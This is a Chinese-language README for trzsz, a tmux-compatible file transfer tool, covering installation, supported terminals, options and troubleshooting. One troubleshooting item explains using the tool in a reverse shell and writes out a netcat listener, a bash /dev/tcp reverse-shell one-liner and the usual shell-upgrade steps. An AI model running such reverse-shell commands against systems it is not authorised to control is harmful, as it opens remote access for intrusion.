# trzsz ( trz / tsz ) - 类似 rz / sz，兼容 tmux 的文件传输工具

[![MIT License](https://img.shields.io/badge/license-MIT-green.svg?style=flat)](https://choosealicense.com/licenses/mit/)
[![PyPI trzsz](https://img.shields.io/pypi/v/trzsz?style=flat)](https://pypi.python.org/pypi/trzsz/)
[![WebSite](https://img.shields.io/badge/WebSite-https%3A%2F%2Ftrzsz.github.io%2F-blue?style=flat)](https://trzsz.github.io/)
[![中文文档](https://img.shields.io/badge/%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3-https%3A%2F%2Ftrzsz.github.io%2Fcn%2F-blue?style=flat)](https://trzsz.github.io/cn/)

`trzsz` ( trz / tsz ) 是一款优秀的文件传输工具，和 lrzsz ( rz / sz ) 类似的、兼容 tmux 的文件传输工具。

## 如何使用

1. 在服务器上安装 `trzsz` ( trz / tsz )，有 [go](https://github.com/trzsz/trzsz-go)、[py](https://github.com/trzsz/trzsz) 和 [js](https://github.com/trzsz/trzsz.js) 三种实现，互相兼容。

2. 本地要使用支持的终端，有本地 shell 的终端可以使用 [trzsz-ssh ( tssh )](https://github.com/trzsz/trzsz-ssh)，或参考下文【支持的终端】。

3. 使用 `trz` ( 类似 `rz` ) 命令上传文件，使用 `tsz` ( 类似 `sz` ) 命令下载文件。

## 为什么做

- 考虑 `laptop -> hostA -> hostB -> docker -> tmux` 这种场景，使用 `scp` 或 `sftp` 是不方便的。

- 在这种场景下，使用 `lrzsz` ( rz / sz ) 是很方便的，但是很可惜它与 `tmux` 不兼容。

- `tmux` 不打算支持 rz / sz ( [906](https://github.com/tmux/tmux/issues/906), [1439](https://github.com/tmux/tmux/issues/1439) )，于是就开发了 `trzsz` ( trz / tsz )。

## 优点介绍

- 支持 **tmux**，包括 tmux 普通模式，以及与 iTerm2 集成的 tmux 命令模式。
- 支持 **传输目录**，`trz -d` 命令上传目录，`tsz -d xxx` 命令下载 xxx 目录。
- 支持 **断点续传**，`trz -y` 或 `tsz -y xxx` 覆盖目标文件会自动进行断点续传。
- 支持 **Windows**，不仅可在 Windows 客户端使用，也可在 Windows ssh 服务器使用。
- 支持 **原生终端**，不需要原生终端做支持，只要使用 `trzsz ssh x.x.x.x` 登录即可。
- 支持 **web 终端**，通过 web 浏览器在本地与服务器之间传输目录和文件。
- 支持 **拖动上传**，将文件和目录拖到终端窗口即可上传到远程服务器。
- 支持 **进度条**，显示当前正在传输的文件名、进度、大小、速度和剩余时间等。
- 更好的 **交互体验**，传输成功或出错时显示友好的结果，`ctrl + c` 优雅中止。

## 安装指南

### 在远程服务器上安装

- 安装 [用 Go 实现的版本](https://github.com/trzsz/trzsz-go)（ ⭐ 推荐 ）

  请查看 Go 版安装指引：[https://trzsz.github.io/cn/go](https://trzsz.github.io/cn/go)

- 或者用 Python3 安装

  ```
  sudo python3 -m pip install --upgrade trzsz
  ```

- 或者用 Python2 安装

  ```
  sudo python2 -m pip install --upgrade trzsz
  ```

- 或者用 Homebrew 安装

  ```
  brew update
  brew install trzsz
  ```

- 或者用 Node.js 安装

  ```
  sudo npm install -g trzsz
  ```

&nbsp;&nbsp;没有 `sudo` 权限也可以安装，只要将安装路径 ( 可能是 `~/.local/bin` ) 添加到 `PATH` 环境变量中即可。

### 支持的终端

- [trzsz-ssh](https://trzsz.github.io/cn/ssh) ( tssh ) -- 内置支持 trzsz 的 ssh 客户端（ ⭐ 推荐 ）。

- [iTerm2](https://iterm2.com/) -- 参考 [Trzsz-iTerm2 安装文档](https://trzsz.github.io/cn/iterm2)。

- [tabby](https://tabby.sh/) -- 安装 [tabby-trzsz](https://github.com/trzsz/tabby-trzsz) 插件即可。

- [electerm](https://electerm.github.io/electerm/) -- 升级到 `1.19.0` 以上的版本即可。

- [ttyd](https://github.com/tsl0922/ttyd) -- 升级到 `1.7.3` 以上的版本，并且启动时加上 `-t enableTrzsz=true`，非 localhost 要用 `https`。

- [trzsz-go](https://trzsz.github.io/cn/go) -- 只要是支持本地 shell 的终端就可以用。

- [trzsz.js](https://trzsz.github.io/cn/js) -- 让运行在浏览器中的 webshell 和用 electron 开发的终端支持 `trzsz`。

&nbsp;&nbsp;_如果你的终端也支持 `trzsz`，请告诉我，我很乐意将它加到此列表中。_

## 使用指南

#### `trz` 上传文件

`trz` 命令可以不带任何参数，将上传文件到当前目录。也可以带一个目录参数，指定上传到哪个目录。

```
trz /tmp/
```

#### `tsz` 下载文件

`tsz` 可以带一个或多个文件名（可使用相对路径或绝对路径，也可使用通配符），将下载指定的文件。

```
tsz file1 file2 file3
```

#### `-q` 静默模式

`trz -q` 或 `tsz -q xxx` ( 加上 `-q` 选项 )，则在传输文件时不显示进度条。

#### `-y` 覆盖模式

`trz -y` 或 `tsz -y xxx` ( 加上 `-y` 选项 )，如果存在相同文件名的文件就直接覆盖，并支持断点续传。

#### `-b` 二进制模式

`trz -b` 或 `tsz -b xxx` ( 加上 `-b` 选项 )，二进制传输模式，对于压缩包、图片、影音等较快。

#### `-e` 转义控制字符

二进制模式时，控制字符可能会导致失败，`trz -eb` 或 `tsz -eb xxx` ( 加上 `-e` 选项 ) 转义所有已知的控制字符。

#### `-d` / `-r` 传输文件夹

`trz -d` 或 `tsz -r xxx` ( 加上 `-d` 或 `-r` 选项 )，则可以上传或下载指定文件夹和文件。

#### `-B` 缓冲区上限

`trz -B 20m` 或 `tsz -B 2M xxx` 等，设置最大缓冲区上限 ( 默认 10M )。会自动根据网速选择合适的缓冲区大小，但不会超过此上限。

#### `-t` 超时时间

`trz -t 30` 或 `tsz -t 30 xxx` 等，设置超时秒数 ( 默认 20 秒 )。在超时时间内，如果无法传完一个缓冲区大小的数据则会报错并退出。设置为 0 或负数，则永不超时。

#### 异常处理方法

- 如果 `tmux` 是运行在本地电脑上。

  - 方案 1：使用 `tmux -CC` 与 iTerm2 集成，请参考 [iTerm2 与 tmux -CC 集成](https://trzsz.github.io/cn/tmuxcc)。
  - 方案 2：在本地电脑上安装 [trzsz-go](https://trzsz.github.io/cn/go)，在 `tmux` 之后用 `trzsz ssh` 登录。
  - 方案 3：在本地电脑上安装 [trzsz-ssh](https://trzsz.github.io/cn/ssh)，在 `tmux` 之后用 `tssh` 登录。

- 如果 `tmux` 是运行在跳板机上。

  - 方案 1：使用 `tmux -CC` 与 iTerm2 集成，请参考 [iTerm2 与 tmux -CC 集成](https://trzsz.github.io/cn/tmuxcc)。
  - 方案 2：在跳板机上安装 [trzsz-go](https://trzsz.github.io/cn/go)，在 `tmux` 之后用 `trzsz -r ssh` 登录。
  - 方案 3：在跳板机上安装 [trzsz-ssh](https://trzsz.github.io/cn/ssh)，在 `tmux` 之后用 `tssh` 登录。

- 如果出现了错误，且 `trzsz` 挂住不能动了：

  - 按组合键 `control + c` 可以停止服务器上的 `trz` 或 `tsz` 进程。
  - 对于 iTerm2 用户，按组合键 `command + option + shift + r` 可以停止 [iTerm2 Coprocesses](https://iterm2.com/documentation-coprocesses.html)。

- 如果 `trz -b` 二进制上传失败，并且登录远程服务器时使用了 `telnet` 或 `docker exec`：

  - 可以试试转义所有控制字符，例如 `trz -eb`。

- 如果 `trz -b` 或 `tsz -b` 二进制传输失败，并且登录远程服务器时使用了 `expect`：

  - 可以试试在 `expect` 脚本前设置环境变量 `export LC_CTYPE=C`，例如：
    ```
    #!/bin/sh
    export LC_CTYPE=C
    expect -c '
      spawn ssh xxx
      expect "xxx: "
      send "xxx\n"
      interact
    '
    ```

- 如果想在反弹 shell 中使用 `trz / tsz` 上传和下载，则需要按以下步骤操作：

  - 1\. 使用 `tssh xxx` 或 `trzsz ssh xxx` 登录服务器。
  - 2\. 在服务器上执行 `nc -lnv 1337`，等待反弹 shell 连接。
  - 3\. 在目标机器反弹连接到服务器，如 `bash -i >& /dev/tcp/192.168.0.1/1337 0>&1`。
  - 4\. 以下在反弹 shell 中操作：
    - 4.1. 转换成交互式 shell，如 `python3 -c 'import pty; pty.spawn("/bin/bash")'`。
    - 4.2. 按下 `ctrl + z` 将反弹 shell 转入后台运行。
    - 4.3. 执行 `stty raw -echo; fg` 屏蔽服务器的回显，并将反弹 shell 转到前台运行。
    - 4.4. 此时按一次回车键，就会显示命令行提示符等了。
    - 4.5. 设置终端环境变量 `export TERM=xterm-256color`（ 此步骤非必须 ）。
    - 4.6. 检查是否存在 `TMUX` 环境变更，若存在则要清掉 `unset TMUX`。
    - 4.7. 此时就可以正常使用 `trz / tsz` 上传和下载了。
  - 5\. 退出交互式 shell 后，输入的字符将不会回显，盲打 `exit` 退出反弹 shell。
  - 6\. 此时在服务器上盲打 `reset` 并回车，恢复终端的默认设置，然后回显就恢复正常了。

## 屏幕截图

#### trzsz 在 iTerm2 中 text 进度条示例

![using trzsz in iTerm2 with text progress bar](https://trzsz.github.io/images/iterm2_text.gif)

#### trzsz 在 iTerm2 中 zenity 进度条示例

![using trzsz in iTerm2 with zenity progress bar](https://trzsz.github.io/images/iterm2_zenity.gif)

#### trzsz 在 tabby 中 tabby-trzsz 插件示例

![using trzsz in tabby with tabby-trzsz plugin](https://trzsz.github.io/images/tabby_trzsz.gif)

## 联系方式

有什么问题可以发邮件给作者 <lonnywong@qq.com>，也可以提 [Issues](https://github.com/trzsz/trzsz/issues) 。欢迎加入 QQ 群：318578930。

## 赞助打赏

[❤️ 赞助 trzsz ❤️](https://github.com/trzsz)，请作者喝杯咖啡 ☕ ? 谢谢您们的支持！
